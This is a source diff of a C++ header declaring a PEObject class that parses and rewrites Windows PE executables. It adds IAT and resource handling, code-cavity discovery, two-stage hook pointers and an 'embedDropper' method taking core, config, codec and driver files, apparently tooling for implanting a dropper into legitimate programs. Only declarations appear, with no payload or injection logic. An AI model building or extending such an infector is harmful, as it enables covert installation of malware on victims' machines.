@@ -13,9 +13,12 @@
 using namespace std;
 
 #include <boost/scoped_ptr.hpp>
+#include <boost/filesystem.hpp>
 #include <boost/function.hpp>
+namespace bf = boost::filesystem;
 
 #include "GenericSection.h"
+#include "IATEntry.h"
 
 #define PE_MAX_DATA_SECTIONS 64
 
@@ -38,15 +41,33 @@ typedef struct _PE_SECTION
 	char*                 data;
 } PESECTION;
 
+typedef struct RESOURCE_DIRECTORY {
+	IMAGE_RESOURCE_DIRECTORY Header;
+	IMAGE_RESOURCE_DIRECTORY_ENTRY Entries[1];
+} *PRESOURCE_DIRECTORY;
+
 class GenericSection;
-class DropperSection;
+class DropperObject;
 class ResourceSection;
+class ResourceDirectory;
+
+class parsing_error : public std::exception
+{
+public:
+	parsing_error(const std::string& msg) : std::exception(msg.c_str()) {}
+};
+
+typedef struct _cavity_t {
+	char* ptr;
+	DWORD va;
+	std::size_t size;
+} Cavity;
 
 class PEObject
 {
 private:	
-	std::fstream _sourceFile;
-	std::fstream _destinationFile;
+	//std::fstream _sourceFile;
+	//std::fstream _destinationFile;
 	
 	char* _rawData;
 	std::size_t  _fileSize;
@@ -71,136 +92,113 @@ private:
 		int _exit;
 	} functionIndex;
 	
+	std::vector< Cavity > _cavities;
+
 	std::map< std::string, std::map<std::string, DWORD> > _calls;
+	IATEntries _iat;
 	
-	// this should be removed in favor of the above map
+	struct {
+		struct {
+			char* ptr;
+			DWORD va;
+		} stage1;
+		struct {
+			char* ptr;
+			DWORD va;
+		} stage2;
+	} _hookPointer;
+	
+	// TODO this should be removed in favor of the above map
 	DWORD _pLoadLibrary;
 	DWORD _pGetProcAddress;
 	
-	bool _hasManifest;
-	string _manifest;
-	
-	bool _action_DOSHeader(size_t offset, size_t size) {
-		cout << __FUNCTION__ << endl;
-
-		return true;
-	}
-	
 	bool _parseDOSHeader();
 	bool _parseNTHeader();
+	bool _parseIAT();
+	bool _parseResources();
+	bool _parseText();
 	
-	int _findCall(std::string& dll, std::string& call);
+	struct {
+		ResourceDirectory* dir;
+		std::size_t size;
+	} _resources;
 	
-	char * _resolveOffset(DWORD offset) 
+	ResourceDirectory* _scanResources(char const * const data);
+	ResourceDirectory* _scanResources(PRESOURCE_DIRECTORY rdRoot, PRESOURCE_DIRECTORY rdToScan, DWORD level);
+	bool _updateResource(WCHAR* type, WCHAR* name, LANGID lang, PBYTE data, DWORD size);
+	bool _updateResource(WORD type, WCHAR* name, LANGID lang, PBYTE data, DWORD size) 
 	{
-		if (offset > _fileSize)
-			return NULL;
-		return (char *)((DWORD)this->_rawData + offset); 
+		return _updateResource(MAKEINTRESOURCEW(type), name, lang, data, size);
 	}
-	
-	DWORD _rvaToOffset(DWORD _rva);
-	char* _resolveRvaToOffset(DWORD rva) { return rva == 0 ? NULL : (char *)_resolveOffset(_rvaToOffset(rva)); }
-	inline DWORD _alignTo( DWORD _size, DWORD _base_size )
+	bool _updateResource(WCHAR* type, WORD name, LANGID lang, BYTE* data, DWORD size)
 	{
-		return ( ((_size + _base_size-1) / _base_size) * _base_size );
+		return _updateResource(type, MAKEINTRESOURCEW(name), lang, data, size);
 	}
+	bool _updateResource(WORD type, WORD name, LANGID lang, BYTE* data, DWORD size)
+	{
+		return _updateResource(MAKEINTRESOURCEW(type), MAKEINTRESOURCEW(name), lang, data, size);
+	}
+	DWORD _sizeOfResources();
+	void _setResourceOffsets(ResourceDirectory* resDir, DWORD newResDirAt);
+	
+	void _findCavities( GenericSection * const section );
+	void _disassembleCode(unsigned char *start, unsigned char *end, unsigned char *ep, int VA);
 	
 public:
 	PEObject(char* data, std::size_t size);
 	virtual ~PEObject(void);
 	
-	bool init();
-	void feed(char* data, size_t size) {
-		this->_rawData = data;
+	unsigned char * atOffset(DWORD offset) 
+	{
+		if (offset > _fileSize)
+			return NULL;
+		return (unsigned char *)( ((DWORD)this->_rawData) + offset); 
 	}
+	
+	unsigned char * atRVA(DWORD rva)
+	{
+		DWORD offset = this->offset(rva);
+		if (offset == 0)
+			return NULL;
+		return rva == 0 ? NULL : (unsigned char *)atOffset(offset);
+	}
+	
+	DWORD offset(DWORD _rva);
+	
+	std::size_t resourceSize() { return _resources.size; }
+	
+	DWORD imageBase() { return _ntHeader->OptionalHeader.ImageBase; }
+	DWORD fileAlignment() { return _ntHeader->OptionalHeader.FileAlignment; }
+	DWORD sectionAlignment() { return _ntHeader->OptionalHeader.SectionAlignment; }
 	
 	PEDOSHEADER dosHeader() { return _dosHeader; }
 	PIMAGE_NT_HEADERS ntHeaders() { return _ntHeader; }
+	PIMAGE_DATA_DIRECTORY dataDirectory(DWORD entry) { return &_ntHeader->OptionalHeader.DataDirectory[entry]; }
 	
-	unsigned char* OEPcode;
-	size_t OEPCodeSize;
-	
-	DWORD EntryPoint_RVA() { return _ntHeader->OptionalHeader.AddressOfEntryPoint; }
-	DWORD EntryPoint_VA() { return _ntHeader->OptionalHeader.ImageBase + _ntHeader->OptionalHeader.AddressOfEntryPoint; }
-	void SetOEP(DWORD oep) { _ntHeader->OptionalHeader.AddressOfEntryPoint = oep; }
-	void WriteData(DWORD rva, char * data, size_t size)
-	{
-		DWORD offset = _rvaToOffset(rva);
-		char * ptr = _rawData + offset;
-		memcpy(ptr, data, size);
-	}
-	
-	unsigned char* GetOEPCode()
-	{
-		DWORD oep = _ntHeader->OptionalHeader.AddressOfEntryPoint;
-		DWORD offset = _rvaToOffset(oep);
-		cout << "OEP " << hex << oep << " @ offset " << hex << offset << endl;
-		return (unsigned char*) _rawData + offset;
-	}
-	
-	PCHAR getRawData() { return _rawData; }
-	
-	bool saveToFile(std::string filename);
 	bool parse();
+	bool saveToFile( std::string filename );
+	
+	DWORD epRVA() { return _ntHeader->OptionalHeader.AddressOfEntryPoint; }
+	DWORD epVA() { return _ntHeader->OptionalHeader.ImageBase + _ntHeader->OptionalHeader.AddressOfEntryPoint; }
+	void writeData(DWORD rva, char * data, size_t size);
+	
+	unsigned char* GetOEPCode();
 	
 	bool hasResources() { return _ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress == 0 ? false : true; }
+	std::size_t writeResources( char* data, DWORD virtualAddress );
 	
-	GenericSection* getSection(DWORD directoryEntryID);
-	GenericSection* findSection(DWORD rva)
-	{
-		std::vector<GenericSection*>::iterator iter = _sections.begin();
-
-		for (; iter != _sections.end(); iter++) {
-			GenericSection* section = *iter;
-			if (rva >= section->VirtualAddress()
-				&& rva < section->VirtualAddress() + section->SizeOfRawData())
-				return section;
-		}
-
-		if (_eofData) 
-		{
-			if (rva >= _eofData->VirtualAddress() && rva < _eofData->VirtualAddress() + _eofData->SizeOfRawData()) {
-				return _eofData;
-			}
-		}
-		
-		return NULL;
-	}
-
-	void setSection(DWORD directoryEntryID, GenericSection* section)
-	{
-		_ntHeader->OptionalHeader.DataDirectory[directoryEntryID].VirtualAddress = section->VirtualAddress();
-		_ntHeader->OptionalHeader.DataDirectory[directoryEntryID].Size = section->VirtualSize();
-	}
+	GenericSection* getSection( DWORD directoryEntryID );
+	GenericSection* findSection( DWORD rva );
+	
+	void setSection( DWORD directoryEntryID, GenericSection* section );
+	void setSection( DWORD directoryEntryID, DWORD VirtualAddress, DWORD VirtualSize );
 	
 	bool isAuthenticodeSigned();
 	
-	DropperSection *createDropperSection(string name);
+	bool embedDropper( bf::path core, bf::path config, bf::path codec, bf::path driver, std::string installDir );
 	
-	bool appendSection(GenericSection* section) 
-	{
-		GenericSection* previousSection = _sections[_sections.size() - 1];
-		
-		DWORD ptrToRawData = previousSection->PointerToRawData() + previousSection->SizeOfRawData();
-		DWORD RVA = previousSection->VirtualAddress() + previousSection->VirtualSize();
-
-		section->SetPointerToRawData( _alignTo( ptrToRawData, _ntHeader->OptionalHeader.FileAlignment ));
-		section->SetVirtualAddress( _alignTo( RVA, _ntHeader->OptionalHeader.SectionAlignment ));
-		
-		section->SetCharacteristics(
-			IMAGE_SCN_CNT_INITIALIZED_DATA 
-			| IMAGE_SCN_MEM_EXECUTE 
-			| IMAGE_SCN_MEM_READ 
-			| IMAGE_SCN_MEM_WRITE); 
-		
-		_sections.push_back(section); 
-		return true; 
-	}
-
-	int exitProcessIndex() { return functionIndex.ExitProcess; }
-	int exitIndex() { return functionIndex.exit; }
-	int _exitIndex() { return functionIndex._exit; }
+	IATEntry const & getIATEntry( std::string const dll, std::string const call );
+	IATEntry const & getIATEntry( DWORD const rva );
 };
 
 #endif /* _PEOBJECT_H */
-
